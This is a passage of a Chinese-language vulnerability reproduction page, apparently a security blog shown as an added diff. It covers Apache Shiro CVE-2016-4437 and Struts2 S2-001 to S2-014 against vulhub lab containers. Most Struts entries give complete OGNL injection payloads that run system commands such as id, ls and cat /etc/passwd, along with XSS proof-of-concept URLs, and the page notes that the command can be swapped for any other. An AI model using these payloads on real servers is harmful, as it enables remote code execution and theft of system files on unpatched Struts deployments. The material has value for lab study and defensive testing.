+<h2 id=漏洞描述-12>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-12>#</a></h2>
+<p><code>Apache Shiro</code>是一款开源的安全框架，提供身份验证、授权、密码学及会话管理功能。<code>Shiro</code>框架直观易用，也能提供健壮的安全性。<code>Apache Shiro 1.2.4</code>及之前版本中，加密的用户信息序列化后存放在名为<code>remember-me</code>的<code>Cookie</code>中，攻击者可以使用<code>Shiro</code>的默认密钥来伪造用户<code>Cookie</code>触发反序列化漏洞，进行在目标机器执行任意命令。</p>
+<h2 id=影响版本-10>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-10>#</a></h2>
+<p><code>Apach Shiro &lt;= 1.2.4</code></p>
+<h2 id=复现思路-8>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-8>#</a></h2>
+<h2 id=漏洞复现-12>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-12>#</a></h2>
+<p>环境复现：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>https://github.com/vulhub/vulhub.git
+cd vulhub/shiro/CVE-2016-4437
+docker-compose up -d
+</code></pre></div><h1 id=struts2-s2-001-表单验证错误远程利用-cve-2007-4556>Struts2 S2-001 表单验证错误远程利用 CVE-2007-4556<a hidden class=anchor aria-hidden=true href=#struts2-s2-001-表单验证错误远程利用-cve-2007-4556>#</a></h1>
+<h2 id=漏洞描述-13>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-13>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-001>S2-001 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>用户提交表单数据失败时，后端会将用户之前提交的参数值使用<code>OGNL</code>表达式<code>%{value}</code>进行解析，然后重新填充到对应表单数据中。</p>
+<h2 id=影响版本-11>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-11>#</a></h2>
+<p><code>Apache Struts 2.0.0 ~ 2.0.8</code></p>
+<h2 id=漏洞复现-13>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-13>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-001
+docker-compose up -d
+</code></pre></div><p>在用户名处输入如下<code>POC</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&#34;id&#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre></div><p>密码随便输。</p>
+<p>成功执行<code>id</code>命令，可以在<code>new java.lang.String[]{"&lt;command>"}</code>中的<code>&lt;command></code>输入想执行的命令。</p>
+<h1 id=struts2-s2-002-s-url和s-a标记上的xss漏洞>Struts2 S2-002 &lt;s: url>和&lt;s: a>标记上的XSS漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-002-s-url和s-a标记上的xss漏洞>#</a></h1>
+<h2 id=漏洞描述-14>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-14>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-002>S2-002 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>对于<code>&lt;s:url></code>和<code>&lt;s:a></code>标签，可以在构造和呈现标签的结果<code>URL</code>时注入不能正确转义的参数值。如：
+构造<code>&lt;s:a></code>结果中包含的参数值可以注入未转义的双引号，从而可以通过转义已渲染的<code>href</code>属性来在生成的<code>HTML</code>中注入代码。
+当<code>includeParams</code>设置为<code>none</code>的任何其他值时，<code>&lt;s:url></code>和<code>&lt;s:a></code>标签无法转义<code>&lt;script></code>标签，可以通过使用<code>GET</code>参数调用包含<code>JSP /</code>动作来利用</p>
+<h2 id=影响版本-12>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-12>#</a></h2>
+<p><code>Struts2 2.0.0 ~ 2.0.11</code></p>
+<h2 id=漏洞复现-14>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-14>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
+http://&lt;ip&gt;:&lt;port&gt;/index.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello
+</code></pre><h1 id=struts2-s2-003-xwork-parameterinterceptors旁路允许ognl语句执行-cve-2008-6504>Struts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504<a hidden class=anchor aria-hidden=true href=#struts2-s2-003-xwork-parameterinterceptors旁路允许ognl语句执行-cve-2008-6504>#</a></h1>
+<h2 id=漏洞描述-15>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-15>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-003>S2-003 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>OGNL</code>提供了广泛的表达式评估功能，可以使攻击者绕过<code>ParameterInterceptor</code>内置的<code>#</code>使用保护，从而能够操纵服务器端上下文对象。</p>
+<p>如，要将<code>#session.user</code>设置为<code>oopsdc</code>，可以使用以下参数名称：</p>
+<pre tabindex=0><code>('\ u0023'+'session 'user ' ')(未使用)= oopsdc
+</code></pre><p>经<code>URL编码</code>后会如此显示：</p>
+<pre tabindex=0><code>('\ u0023'％20％2b％20'session 'user \ '))(未使用)= oopsdc
+</code></pre><h2 id=影响版本-13>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-13>#</a></h2>
+<p><code>Structs 2.0.0 ~ 2.0.11.2</code></p>
+<h2 id=漏洞复现-15>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-15>#</a></h2>
+<p><code>S2-003</code>算是<code>S2-005</code>的前身，其<code>POC</code>为<code>S2-005</code>的缩小版，因为<code>S2-003</code>之后官方修改了安全配置，默认让<code>SecurityMemberAccess</code>(管理<code>OGNL</code>权限的类)的<code>allowStaticMethodAccessz</code>值为<code>false</code>。</p>
+<p>这里把<code>S2-005</code>的<code>POC</code>去掉<code>&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)</code>这句话。</p>
+<pre tabindex=0><code>?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
+</code></pre><p>测试<code>URL</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/showcase.action
+</code></pre><p>修改后<code>URL</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
+</code></pre><p>直接执行<code>ipconfig</code>命令。</p>
+<h1 id=struts2-s2-004-提供静态内容时的目录遍历漏洞-cve-2008-6505>Struts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505<a hidden class=anchor aria-hidden=true href=#struts2-s2-004-提供静态内容时的目录遍历漏洞-cve-2008-6505>#</a></h1>
+<h2 id=漏洞描述-16>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-16>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-004>S2-004 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-005-xwork-parameterinterceptors旁路允许rce>Struts2 S2-005 XWork ParameterInterceptors旁路允许RCE<a hidden class=anchor aria-hidden=true href=#struts2-s2-005-xwork-parameterinterceptors旁路允许rce>#</a></h1>
+<h2 id=漏洞描述-17>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-17>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-005>S2-005 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>通过<code>unicode</code>编码<code>\u0023</code>绕过<code>struts</code>对<code>#</code>的过滤,再通过设置<code>xwork.MethodAccessor.denyMethodExecution</code>为<code>false</code>、<code>memberAccess.allowStaticMethodAccess</code>为<code>true</code>来绕过沙盒。</p>
+<h2 id=影响版本-14>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-14>#</a></h2>
+<p><code>Apache Struts 2.0.0 ~ 2.1.8.1</code></p>
+<h2 id=漏洞复现-16>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-16>#</a></h2>
+<p>环境搭建：</p>
+<pre tabindex=0><code>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-005
+docker-compose up -d
+</code></pre><p><code>POC</code>：</p>
+<pre tabindex=0><code>/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29
+</code></pre><p>更改<code>POC</code>中的<code>id</code>值就能执行任意指令。</p>
+<h1 id=struts2-s2-006-xwork的多个xss生成错误页面>Struts2 S2-006 XWork的多个XSS生成错误页面<a hidden class=anchor aria-hidden=true href=#struts2-s2-006-xwork的多个xss生成错误页面>#</a></h1>
+<h2 id=漏洞描述-18>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-18>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-006>S2-006 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-007-出现转换错误时用户输入被评估为ognl表达式-cve-2012-0838>Struts2 S2-007 出现转换错误时，用户输入被评估为OGNL表达式 CVE-2012-0838<a hidden class=anchor aria-hidden=true href=#struts2-s2-007-出现转换错误时用户输入被评估为ognl表达式-cve-2012-0838>#</a></h1>
+<h2 id=漏洞描述-19>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-19>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-007>S2-007 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>当项目配置了验证规则、类型转换出错时，会造成错误的字符串拼接，进而造成了<code>OGNL</code>语句的执行。后端用代码拼接 <code>"'" + value + "'" </code>并对其进行 <code>OGNL </code>表达式解析，类似<code>SQL注入</code>单引号闭合，官方修复时使用<code>escape</code> 对单引号转义，也跟<code>SQL注入</code>比较相似，。</p>
+<h2 id=影响版本-15>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-15>#</a></h2>
+<p><code>Apache Structs 2.0.0 ~ 2.2.3</code></p>
+<h2 id=漏洞复现-17>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-17>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-007
+docker-compose up -d
+
+<span style=color:#75715e># 我默认进入路径显示404，使用如下路径即可</span>
+<span style=color:#75715e># http：//&lt;ip&gt;:&lt;port&gt;/index.jsp</span>
+</code></pre></div><p>随便给<code>name</code>、<code>email</code>两个属性赋值，<code>age</code>使用如下<code>Payload</code>，<code>bp</code>抓取提交后的请求包，发送到<code>Repeater</code>模块：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&#39; + (#_memberAccess[&#34;allowStaticMethodAccess&#34;]=true,#foo=new java.lang.Boolean(&#34;false&#34;) ,#context[&#34;xwork.MethodAccessor.denyMethodExecution&#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;
+</code></pre></div><p>在响应包中查看<code>age</code>的<code>input</code>标签，值就是我们执行的<code>id</code>命令的结果。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;age&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uid=0(root) gid=0(root) groups=0(root)
+</span><span style=color:#e6db74>&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user_age&#34;</span>/&gt;
+</code></pre></div><h1 id=structs2-s2-008-struts2中的多个关键漏洞-cve-2012-0391>Structs2 S2-008 Struts2中的多个关键漏洞 CVE-2012-0391<a hidden class=anchor aria-hidden=true href=#structs2-s2-008-struts2中的多个关键漏洞-cve-2012-0391>#</a></h1>
+<h2 id=漏洞描述-20>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-20>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-008>S2-008 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>漏洞主要利用系统未对传入参数进行严格限制的缺陷，导致多个地方可执行恶意代码。</p>
+<p>第一种情况是<code>S2-007</code>，在异常处理时的<code>OGNL</code>执行。</p>
+<p>第二种情况是<code>cookie</code>，虽然<code>Struts2</code>没有对恶意代码进行限制，但<code>Java</code>的<code>webserver(Tomcat)</code>对<code>cookie</code>名称有较多限制，在传入<code>Struts2</code>之前就被处理。</p>
+<p>第三种情况需要开启<code>devModedebug</code>模式。</p>
+<h2 id=影响版本-16>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-16>#</a></h2>
+<p><code>Apache Struts 2.1.0 ~ 2.3.1</code></p>
+<h2 id=复现思路-9>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-9>#</a></h2>
+<p>第三种情况，使用<code>devMode</code>的<code>debug</code>模式造成任意代码执行。</p>
+<h2 id=漏洞复现-18>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-18>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-008
+docker-compose up -d
+</code></pre></div><p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
+</code></pre><p>回显为<code>null</code>。</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29
+</code></pre><p>成功执行<code>id</code>命令。</p>
+<h1 id=struts2-s2-009-parameterintercetptor远程命令执行漏洞>Struts2 S2-009 ParameterIntercetptor远程命令执行漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-009-parameterintercetptor远程命令执行漏洞>#</a></h1>
+<h2 id=漏洞描述-21>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-21>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-009>S2-009 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>跟<code>S2-003</code>、<code>S2-005</code>属于同一种类型，<code>Structs2</code>对<code>S2-003</code>的修复方法是禁止<code>#</code>号，<code>S2-005</code>通过使用编码<code>\u0023</code>或<code>\43</code>绕过。<code>Struts2</code>对<code>S2-005</code>的修复方法是禁止<code>\</code>等特殊符号。</p>
+<p>但如果当前<code>action</code>中接受了某个参数<code>example</code>，这个参数将进入<code>OGNL</code>的上下文。所以我们可将<code>OGNL</code>表达式放在<code>example</code>参数中，然后使用<code>/HelloWorld.action?example=&(example)('xxx')=1</code>的方法来执行，绕过官方的限制。</p>
+<h2 id=影响版本-17>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-17>#</a></h2>
+<p><code>Apache Structs 2.1.0 ~ 2.3.1.1</code></p>
+<h2 id=漏洞复现-19>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-19>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-009
+docker-compose up -d
+</code></pre></div><p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5?age=123&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true
+</code></pre><p>在服务器创建<code>/tmp/success</code>文件，无回显。</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5.action?age=123&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
+</code></pre><p>执行<code>ls</code>命令并下载结果文件。</p>
+<h1 id=struts-s2-010-使用struts2令牌机制进行csrf保护时可能会因滥用已知会话属性绕过检查>Struts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查<a hidden class=anchor aria-hidden=true href=#struts-s2-010-使用struts2令牌机制进行csrf保护时可能会因滥用已知会话属性绕过检查>#</a></h1>
+<h2 id=漏洞描述-22>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-22>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-010>S2-010 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h2 id=影响版本-18>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-18>#</a></h2>
+<p><code>Apache Struts 2.0.0 ~ 2.3.4</code></p>
+<h1 id=struts2-s2-011-长请求参数名称可能会显著提高dos攻击有效性>Struts2 S2-011 长请求参数名称可能会显著提高DOS攻击有效性<a hidden class=anchor aria-hidden=true href=#struts2-s2-011-长请求参数名称可能会显著提高dos攻击有效性>#</a></h1>
+<h2 id=漏洞描述-23>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-23>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-011>S2-011 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h2 id=影响版本-19>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-19>#</a></h2>
+<p><code>Apache Struts 2.0.0 ~ 2.3.4</code></p>
+<h1 id=struts2-s2-012-展示应用程序漏洞允许远程命令执行-cve-2013-1965>Struts2 S2-012 展示应用程序漏洞允许远程命令执行 CVE-2013-1965<a hidden class=anchor aria-hidden=true href=#struts2-s2-012-展示应用程序漏洞允许远程命令执行-cve-2013-1965>#</a></h1>
+<h2 id=漏洞描述-24>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-24>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-012>S2-012 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>若在配置<code>Action</code>中<code>Result</code>使用了重定向类型，且使用<code>${param_name}</code>作为重定向变量，如：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;package</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;S2-012&#34;</span> <span style=color:#a6e22e>extends=</span><span style=color:#e6db74>&#34;struts-default&#34;</span><span style=color:#f92672>&gt;</span>
+    <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;user&#34;</span> <span style=color:#a6e22e>class=</span><span style=color:#e6db74>&#34;com.demo.action.UserAction&#34;</span><span style=color:#f92672>&gt;</span>
+        <span style=color:#f92672>&lt;result</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;redirect&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;redirect&#34;</span><span style=color:#f92672>&gt;</span>/index.jsp?name=${name}<span style=color:#f92672>&lt;/result&gt;</span>
+        <span style=color:#f92672>&lt;result</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;input&#34;</span><span style=color:#f92672>&gt;</span>/index.jsp<span style=color:#f92672>&lt;/result&gt;</span>
+        <span style=color:#f92672>&lt;result</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;success&#34;</span><span style=color:#f92672>&gt;</span>/index.jsp<span style=color:#f92672>&lt;/result&gt;</span>
+    <span style=color:#f92672>&lt;/action&gt;</span>
+<span style=color:#f92672>&lt;/package&gt;</span>
+</code></pre></div><p><code>UserAction</code>中定义了一个<code>name</code>变量，当触发<code>redirect</code>类型返回时，<code>Structs2</code>获取使用<code>${name}</code>获取它的值，在这个过程中会对<code>name</code>参数的值执行<code>OGNL</code>表达式解析导致可以插入任意<code>OGNL</code>表达式导致命令执行。</p>
+<h2 id=影响版本-20>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-20>#</a></h2>
+<p><code>Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 </code></p>
+<h2 id=漏洞复现-20>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-20>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-012
+docker-compose up -d
+</code></pre></div><p><code>URL</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
+</code></pre><p><code>POC</code>：</p>
+<pre tabindex=0><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;, &quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre><p><code>bp</code>抓包看回显。</p>
+<h1 id=struts2-s2-013-url和锚标记的includeparams属性中存在的远程命令执行漏洞-cve-2013-1966>Struts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966<a hidden class=anchor aria-hidden=true href=#struts2-s2-013-url和锚标记的includeparams属性中存在的远程命令执行漏洞-cve-2013-1966>#</a></h1>
+<h2 id=漏洞描述-25>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-25>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-013>S2-013 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>struts</code>的标签中<code>s:a</code>和<code>s:url</code>都有一个<code>includeParams</code>属性：</p>
+<pre tabindex=0><code>none	:	URL中不包含任何参数(默认)
+get		:	仅包含URL中的GET参数
+all		:	在URL中包含GET和POST参数
+</code></pre><p>当<code>includeParams=all</code>的时候，会将本次请求的<code>GET</code>和<code>POST</code>参数都放在<code>URL</code>的<code>GET</code>参数上。
+本来<code>urldecode</code>一下就能得到<code>params</code>，但<code>struts</code>给<code>OGNL</code>解析，造成了任意代码执行。</p>
+<h2 id=影响版本-21>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-21>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.14</code></p>
+<h2 id=漏洞复现-21>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-21>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
+</code></pre><h1 id=struts2-s2-014-强制参数包含在url和锚标记中引入的漏洞允许远程命令执行会话访问操作及xss攻击-cve-2013-1966-cve-2013-2115>Struts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115<a hidden class=anchor aria-hidden=true href=#struts2-s2-014-强制参数包含在url和锚标记中引入的漏洞允许远程命令执行会话访问操作及xss攻击-cve-2013-1966-cve-2013-2115>#</a></h1>
